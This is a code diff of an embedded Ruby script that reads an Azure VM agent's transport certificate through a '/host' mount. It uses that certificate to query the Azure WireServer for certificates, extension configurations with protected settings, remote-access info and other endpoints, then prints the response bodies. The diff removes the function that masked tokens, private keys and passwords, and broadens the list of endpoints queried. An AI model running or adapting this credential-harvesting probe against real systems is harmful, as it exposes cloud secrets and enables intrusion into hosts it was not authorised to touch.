@@ -31,7 +31,6 @@ end
 inner = <<'RUBY'
 require 'net/http'
 require 'json'
-require 'digest'
 require 'base64'
 
 HOST = '/host'
@@ -43,17 +42,10 @@ def mask_blobs(s)
   end
 end
 
-def mask_secrets(s)
-  s.gsub(/("[^"]*(?:token|privatekey|secret|password|accesskey|signature)[^"]*"\s*:\s*")([^"]*)(")/i) do
-    "#{$1}#{$2[0, 8]}...(len=#{$2.length})#{$3}"
-  end
-end
-
 der = `openssl x509 -in #{HOST}/var/lib/waagent/TransportCert.pem -outform DER 2>/dev/null`
 CERT_B64 = der.empty? ? nil : Base64.strict_encode64(der)
-XV = { 'x-ms-version' => '2015-04-05' }
-CERTH = CERT_B64 ? { 'x-ms-guest-agent-public-x509-cert' => CERT_B64 } : {}
-puts "VX_CERT der_len=#{der.bytesize}"
+HDRS = { 'x-ms-version' => '2015-04-05' }
+HDRS['x-ms-guest-agent-public-x509-cert'] = CERT_B64 if CERT_B64
 
 def http_get(host, port, path, headers = {})
   h = Net::HTTP.new(host, port)
@@ -67,62 +59,29 @@ rescue => e
   ["ERR", "#{e.class}: #{e.message[0, 100]}"]
 end
 
-# ---- goalstate with x-ms-version ----
-gc, gs = http_get('168.63.129.16', 80, '/machine/?comp=goalstate', XV.merge(CERTH))
-puts "VX_WS goalstate -> #{gc} len=#{gs.bytesize} #{mask_blobs(gs)[0, 400].inspect}"
+_, gs = http_get('168.63.129.16', 80, '/machine/?comp=goalstate', HDRS)
 cid = gs[/<ContainerId>([^<]+)/, 1]
 inc = gs[/<Incarnation>([^<]+)/, 1]
-puts "VX_WS_PARSE container=#{cid} incarnation=#{inc}"
+puts "VX_PARSE container=#{cid} incarnation=#{inc}"
 
-# ---- (1) extensionsConfig — the priority target ----
-if cid && inc
-  c, b = http_get('168.63.129.16', 80, "/machine/#{cid}/#{inc}?comp=extensionsConfig", XV.merge(CERTH))
-  puts "VX_WS extensionsConfig -> #{c} len=#{b.bytesize}"
-  puts "VX_EC_TAGS #{b.scan(/<([A-Za-z_]+)/).flatten.tally.sort_by { |_, v| -v }.first(40).inspect}"
-  puts "VX_EC_PROTECTED_PRESENT=#{b =~ /protectedSettings/i ? 'YES' : 'no'}"
-  puts "VX_EC_BODY #{mask_blobs(mask_secrets(b))[0, 4200].inspect}"
-  c, b = http_get('168.63.129.16', 80, "/machine/#{cid}/#{inc}?comp=certificates", XV.merge(CERTH))
-  puts "VX_WS certificates -> #{c} len=#{b.bytesize} #{mask_blobs(b)[0, 800].inspect}"
-  c, b = http_get('168.63.129.16', 80, "/machine/#{cid}/#{inc}?comp=hostingEnvironmentConfig", XV.merge(CERTH))
-  puts "VX_WS hostingEnvConfig -> #{c} len=#{b.bytesize} #{mask_blobs(b)[0, 800].inspect}"
-else
-  puts 'VX_WS_SKIP no container/incarnation'
+urls = [
+  "/machine/#{cid}/#{inc}?comp=certificates",
+  "/machine/?comp=certificates&incarnation=#{inc}",
+  "/machine/#{cid}/#{inc}?comp=extensionsConfig",
+  "/machine/?comp=extensionsConfig&incarnation=#{inc}",
+  "/machine/?comp=extensionsConfig",
+  "/machine/#{cid}/#{inc}?comp=sharedConfig",
+  "/machine/?comp=sharedConfig&incarnation=#{inc}",
+  "/machine/#{cid}/#{inc}?comp=hostingEnvironmentConfig",
+  "/machine/?comp=hostingEnvironmentConfig&incarnation=#{inc}",
+  "/machine/#{cid}/#{inc}?comp=remoteAccessInfo",
+  "/machine/?comp=versions",
+  "/machine/?comp=health"
+]
+urls.each do |u|
+  c, b = http_get('168.63.129.16', 80, u, HDRS)
+  puts "VX_WS #{u} -> #{c} len=#{b.bytesize} #{mask_blobs(b)[0, 1100].inspect}"
 end
-
-# ---- (2) hostplugin /vmSettings FULL body ----
-c, b = http_get('168.63.129.16', 32526, '/vmSettings')
-puts "VX_HP vmSettings -> #{c} len=#{b.bytesize}"
-begin
-  j = JSON.parse(b)
-  puts "VX_VMSET_TOPKEYS #{j.keys.inspect}"
-  lines = []
-  walk = lambda do |o, path|
-    case o
-    when Hash
-      o.each do |k, v|
-        if k =~ /settings|protected|certificat/i
-          if v.is_a?(Hash)
-            lines << "#{path}/#{k} keys=#{v.keys.inspect[0, 200]}"
-          elsif v.is_a?(Array)
-            lines << "#{path}/#{k} array[#{v.length}]"
-          else
-            lines << "#{path}/#{k} #{v.class} len=#{v.to_s.length}"
-          end
-        end
-        walk.call(v, "#{path}/#{k}") if v.is_a?(Hash) || v.is_a?(Array)
-      end
-    when Array
-      o.each_with_index { |v, i| walk.call(v, "#{path}[#{i}]") }
-    end
-  end
-  walk.call(j, '')
-  lines.first(60).each { |l| puts "VX_SET #{l}" }
-  puts "VX_SET_COUNT #{lines.length}"
-rescue => e
-  puts "VX_VMSET_PARSE_ERR #{e.message[0, 100]}"
-end
-puts "VX_VMSET_BODY #{mask_blobs(mask_secrets(b))[0, 2600].inspect}"
-
 puts 'VX_INNER_DONE'
 RUBY
 
